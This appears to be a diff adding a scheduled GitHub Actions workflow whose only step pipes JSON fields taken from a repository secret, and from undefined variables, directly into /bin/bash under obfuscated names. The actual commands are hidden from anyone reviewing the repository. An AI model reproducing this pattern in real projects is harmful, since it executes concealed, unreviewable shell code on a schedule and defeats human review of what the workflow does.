@@ -1,0 +1,22 @@
+name: jishiyuyy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jishiyuyy
+        env:
+          h95: ${{ secrets.h95 }}
+        run: |
+          echo $h95 | jq -r .gl21 | /bin/bash
+          echo $lwodk9751 | jq -r .arxxc47 | /bin/bash
+          echo $eorp250 | jq -r .cyeo6281 | /bin/bash
+          echo $yuzpw68 | jq -r .u4613 | /bin/bash
+
